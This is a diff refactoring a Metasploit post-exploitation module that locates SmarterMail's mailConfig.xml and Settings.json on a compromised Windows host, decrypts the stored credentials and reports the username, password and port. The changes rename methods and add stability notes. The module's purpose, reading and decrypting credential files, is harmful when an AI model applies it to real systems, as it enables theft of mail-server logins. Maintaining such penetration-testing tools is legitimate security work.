@@ -30,7 +30,12 @@ class MetasploitModule < Msf::Post
           ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']
         ],
         'Platform' => ['win'],
-        'SessionTypes' => ['meterpreter', 'shell']
+        'SessionTypes' => ['meterpreter', 'shell'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -48,7 +53,7 @@ class MetasploitModule < Msf::Post
     decipher.update(encrypted) + decipher.final
   end
 
-  def get_bound_port(data)
+  def bound_port(data)
     port = nil
 
     begin
@@ -61,16 +66,16 @@ class MetasploitModule < Msf::Post
     port
   end
 
-  def get_remote_drive
-    @drive ||= expand_path('%SystemDrive%').strip
+  def system_drive
+    @system_drive ||= expand_path('%SystemDrive%').strip
   end
 
-  def get_web_server_port
+  def web_server_port
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
-      path = %(#{get_remote_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Web Server\\Settings.json).strip
+      path = %(#{system_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Web Server\\Settings.json).strip
       if file?(path)
         data = read_file(path)
-        return get_bound_port(data)
+        return bound_port(data)
       end
     end
 
@@ -80,11 +85,11 @@ class MetasploitModule < Msf::Post
   #
   # Find SmarterMail 'mailConfig.xml' config file
   #
-  def get_mail_config_path
+  def mail_config_path
     found_path = ''
 
     ['Program Files (x86)', 'Program Files'].each do |program_dir|
-      path = %(#{get_remote_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml).strip
+      path = %(#{system_drive}\\#{program_dir}\\SmarterTools\\SmarterMail\\Service\\mailConfig.xml).strip
       vprint_status "#{peer} - Checking for SmarterMail config file: #{path}"
       if file?(path)
         found_path = path
@@ -171,7 +176,7 @@ class MetasploitModule < Msf::Post
   #
   def run
     # check for SmartMail config file
-    config_path = get_mail_config_path
+    config_path = mail_config_path
     if config_path.blank?
       print_error "#{peer} - Could not find SmarterMail config file"
       return
@@ -185,7 +190,7 @@ class MetasploitModule < Msf::Post
     end
 
     # report result
-    port = get_web_server_port || 9998 # Default is 9998
+    port = web_server_port || 9998 # Default is 9998
     user = result[:username]
     pass = result[:password]
     type = result[:private_type]
